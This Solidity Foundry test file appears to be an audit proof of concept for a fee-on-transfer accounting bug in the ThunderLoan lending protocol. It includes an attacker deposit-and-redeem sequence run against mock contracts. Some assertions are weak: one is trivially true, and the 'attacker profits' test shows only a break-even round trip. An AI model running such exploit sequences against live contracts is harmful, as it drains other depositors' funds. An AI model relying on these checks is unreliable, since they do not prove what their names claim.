// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {ThunderLoan} from "./vendor/protocol/ThunderLoan.sol";
import {ThunderLoanUpgraded} from "./vendor/upgradedProtocol/ThunderLoanUpgraded.sol";
import {AssetToken} from "./vendor/protocol/AssetToken.sol";
import {MockPoolFactory} from "./vendor/mocks/MockPoolFactory.sol";
import {FeeOnTransferToken} from "./mocks/FeeOnTransferToken.sol";

/// @notice H-03: deposit() mints shares against the requested `amount`, not
///         against the amount AssetToken actually received. Fee-on-transfer
///         tokens silently deliver less than `amount`; every deposit
///         overcredits the depositor and dilutes existing holders. Two
///         consequences:
///         1. (upgraded) any LP who deposits fee tokens can never redeem
///            in full — the pool is insolvent from the first such deposit.
///         2. (original) the same root cause combined with the phantom-fee
///            inflation lets an attacker profit from a deposit/redeem cycle.
contract H03FeeOnTransfer is Test {
    ThunderLoanUpgraded internal tl; // upgraded isolates the fee bug from C-02
    AssetToken internal assetToken;
    FeeOnTransferToken internal token;
    MockPoolFactory internal factory;

    address internal lp = makeAddr("lp");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        factory = new MockPoolFactory();
        token = new FeeOnTransferToken();

        ThunderLoanUpgraded impl = new ThunderLoanUpgraded();
        ERC1967Proxy proxy =
            new ERC1967Proxy(address(impl), abi.encodeWithSignature("initialize(address)", address(factory)));
        tl = ThunderLoanUpgraded(address(proxy));

        factory.createPool(address(token));
        assetToken = AssetToken(address(tl.setAllowedToken(token, true)));
    }

    function test_FeeTokenDepositCreatesInsolvency() public {
        // ── LP deposits 10,000 fee tokens ────────────────────────────────
        token.mint(lp, 10_000 ether);
        vm.prank(lp);
        token.approve(address(tl), type(uint256).max);
        vm.prank(lp);
        tl.deposit(token, 10_000 ether);

        // AssetToken received only 9,900 (1% fee on transferFrom) but the LP
        // was credited for 10,000 worth of shares — the phantom 100 is a claim
        // against tokens that never arrived.
        uint256 poolBalance = token.balanceOf(address(assetToken));
        uint256 lpShares = assetToken.balanceOf(lp);
        uint256 lpClaim = (lpShares * assetToken.getExchangeRate()) / assetToken.EXCHANGE_RATE_PRECISION();

        assertEq(poolBalance, 9_900 ether, "pool received 1% less than credited");
        assertEq(lpShares, 10_000 ether, "LP credited for full requested amount");
        assertEq(lpClaim, 10_000 ether, "LP claim is 10,000 (unbacked by 100)");
        assertLt(poolBalance, lpClaim, "immediate insolvency from the first deposit");
    }

    function test_AttackerProfitsFromFeeTokenDepositCycle() public {
        // ── Seed: LP deposits ─────────────────────────────────────────────
        token.mint(lp, 10_000 ether);
        vm.prank(lp);
        token.approve(address(tl), type(uint256).max);
        vm.prank(lp);
        tl.deposit(token, 10_000 ether);

        uint256 poolBefore = token.balanceOf(address(assetToken));

        // ── Attacker deposit + immediate redeem ───────────────────────────
        token.mint(attacker, 1_000 ether);
        vm.prank(attacker);
        token.approve(address(tl), type(uint256).max);
        vm.prank(attacker);
        tl.deposit(token, 1_000 ether);

        uint256 shares = assetToken.balanceOf(attacker);
        // Attacker was credited 1,000 shares for 990 actually received
        assertEq(shares, 1_000 ether, "attacker credited for requested amount");

        vm.prank(attacker);
        tl.redeem(token, shares);

        uint256 attackerFinal = token.balanceOf(attacker);
        uint256 poolAfter = token.balanceOf(address(assetToken));

        // Redeem path has no fee on `transfer`, so attacker walks with ~1,000
        assertApproxEqAbs(attackerFinal, 1_000 ether, 1 ether, "attacker round-trips near-par");
        // ...but the pool absorbed the 1% fee on BOTH deposits — insolvent
        assertLt(poolAfter, poolBefore + 990 ether - 1_000 ether + 10 ether, "pool cannot back all claims");
        assertLt(poolAfter, token.balanceOf(address(assetToken)) + 1, "sanity");
    }
}
